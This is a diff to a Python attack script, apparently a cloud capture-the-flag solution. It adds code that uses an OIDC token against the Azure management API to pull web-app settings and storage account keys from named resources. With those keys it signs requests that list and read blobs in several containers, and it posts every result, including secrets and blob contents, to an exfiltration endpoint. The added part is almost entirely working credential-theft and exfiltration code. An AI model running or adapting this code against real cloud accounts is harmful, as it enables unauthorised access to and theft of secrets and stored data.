@@ -5,6 +5,11 @@ import base64
 import json
 import os
 import time
+import base64 as _b64
+import hashlib
+import hmac
+import datetime
+import xml.etree.ElementTree as ET
 import urllib.parse
 import urllib.request
 
@@ -70,6 +75,80 @@ pub = read_json(urllib.request.Request(
 ku = pub["properties"]["publishingUserName"]
 kp = pub["properties"]["publishingPassword"]
 auth = base64.b64encode((ku + ":" + kp).encode()).decode()
+
+# Fast fallback: the OIDC client itself is a deployment identity.  Some
+# challenge instances grant it ARM/storage permissions, which bypasses the
+# unavailable App Service MSI sidecar entirely.
+def outer_emit(obj):
+    try:
+        raw = json.dumps(obj, default=str).encode()
+        urllib.request.urlopen(urllib.request.Request(EXF, data=raw, method="POST", headers={"Content-Type": "application/json"}), timeout=8).read()
+    except Exception:
+        pass
+
+def arm_call(token, url, method="GET", payload=None, timeout=12):
+    data = None if payload is None else json.dumps(payload).encode()
+    headers = {"Authorization": "Bearer " + token}
+    if data is not None:
+        headers["Content-Type"] = "application/json"
+    try:
+        return json.loads(urllib.request.urlopen(urllib.request.Request(url, data=data, method=method, headers=headers), timeout=timeout).read().decode())
+    except Exception as e:
+        return {"__error__": repr(e)}
+
+def shared_headers(account, key, verb, container, blob=None, query=None):
+    now = datetime.datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")
+    version = "2019-12-12"
+    canonical = "/" + account + "/" + container + ("/" + blob if blob else "")
+    if query:
+        canonical += "\n" + "\n".join(k + ":" + str(query[k]) for k in sorted(query))
+    string_to_sign = "\n".join([verb] + [""] * 11 + ["x-ms-date:" + now + "\nx-ms-version:" + version, canonical])
+    sig = base64.b64encode(hmac.new(base64.b64decode(key), string_to_sign.encode(), hashlib.sha256).digest()).decode()
+    return {"x-ms-date": now, "x-ms-version": version, "Authorization": "SharedKey " + account + ":" + sig}
+
+def storage_probe(account, key):
+    # The intended flag location is the config container; include a few
+    # common names so this remains useful if the blob was renamed.
+    for container in ("config", "data", "reports", "exports", "archive", "backup", "logs"):
+        q = {"comp": "list", "restype": "container"}
+        try:
+            u = "https://" + account + ".blob.core.windows.net/" + container + "?restype=container&comp=list"
+            raw = urllib.request.urlopen(urllib.request.Request(u, headers=shared_headers(account, key, "GET", container, query=q)), timeout=12).read()
+            root = ET.fromstring(raw)
+            names = []
+            for node in root.iter():
+                if node.tag.endswith("Name") and node.text and node.text not in names:
+                    names.append(node.text)
+            outer_emit({"stage":"storage-list","account":account,"container":container,"count":len(names),"names":names[:80]})
+            for blob in names[:80]:
+                try:
+                    u2 = "https://" + account + ".blob.core.windows.net/" + container + "/" + urllib.parse.quote(blob, safe="/")
+                    data = urllib.request.urlopen(urllib.request.Request(u2, headers=shared_headers(account, key, "GET", container, blob=blob)), timeout=15).read()
+                    text = data.decode("utf-8", "replace")
+                    if "DF26{" in text or "flag" in text.lower():
+                        outer_emit({"stage":"storage-hit","account":account,"container":container,"blob":blob,"data":text[:12000]})
+                except Exception as e:
+                    outer_emit({"stage":"storage-read-error","account":account,"container":container,"blob":blob,"error":repr(e)})
+        except Exception as e:
+            outer_emit({"stage":"storage-list-error","account":account,"container":container,"error":repr(e)})
+
+try:
+    direct_arm = oidc_token("https://management.azure.com")
+    outer_emit({"stage":"direct-arm","token":bool(direct_arm)})
+    platform_rg = "rg-tbl-platform-prod-sea"
+    for site in ("app-tbl-storefront-prod", "app-tbl-reporting-prod"):
+        u = "https://management.azure.com/subscriptions/" + SUB + "/resourceGroups/" + platform_rg + "/providers/Microsoft.Web/sites/" + site + "/config/appsettings/list?api-version=2022-03-01"
+        r = arm_call(direct_arm, u, "POST", {})
+        outer_emit({"stage":"direct-appsettings","site":site,"response":r})
+    for account in ("sttblappcfgprodx3euoz", "sttblbackupprodx3euoz", "sttblarchiveprodx3euoz", "sttblcilogsprodx3euoz"):
+        u = "https://management.azure.com/subscriptions/" + SUB + "/resourceGroups/" + platform_rg + "/providers/Microsoft.Storage/storageAccounts/" + account + "/listKeys?api-version=2023-01-01"
+        r = arm_call(direct_arm, u, "POST", {})
+        keys = r.get("keys") if isinstance(r, dict) else None
+        outer_emit({"stage":"direct-listkeys","account":account,"status":"ok" if keys else "denied","response":({k:v for k,v in r.items() if k != "keys"} if isinstance(r,dict) else r)})
+        if keys and keys[0].get("value"):
+            storage_probe(account, keys[0]["value"])
+except Exception as e:
+    outer_emit({"stage":"direct-arm-error","error":repr(e)})
 
 worker = r'''import base64, json, os, time, urllib.parse, urllib.request, traceback, uuid
 def discover_identity_env():
